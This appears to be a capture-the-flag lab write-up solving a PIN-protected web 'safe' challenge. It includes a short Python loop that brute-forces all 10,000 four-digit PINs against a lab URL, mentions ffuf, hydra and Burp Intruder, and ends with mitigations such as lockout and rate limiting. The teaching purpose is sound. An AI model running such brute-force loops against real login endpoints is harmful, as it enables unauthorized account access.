## Solution

1. Send any PIN: the safe answers "PIN incorrecto" without penalizing you. There is no lockout or delay.
2. The space is only 10,000 values, so everything can be tried. With a script:

   ```python
   import requests
   url = "http://<your-session>.lab.localhost:8081/abrir"
   for n in range(10000):
       r = requests.post(url, data={"pin": f"{n:04d}"})
       if "CYBERLAB" in r.text:
           print(n, r.text)
           break
   ```

   Or with `ffuf` and a list of numbers from 0000 to 9999 (`seq -w 0 9999`), filtering out responses that are not "PIN incorrecto".

3. One of the 10,000 responses opens the safe and shows the flag.

## What you learned

- Brute force works when there are few combinations and no brake.
- Automating requests is a basic skill: scripts, `curl` in a loop, Burp Intruder, `ffuf`, `hydra`.
- A short secret is only safe if the system limits attempts.

## How to prevent it

Limit attempts per user and per source, temporarily lock out after several failures, add increasing delays, require longer secrets or a second factor, and monitor failed attempts.
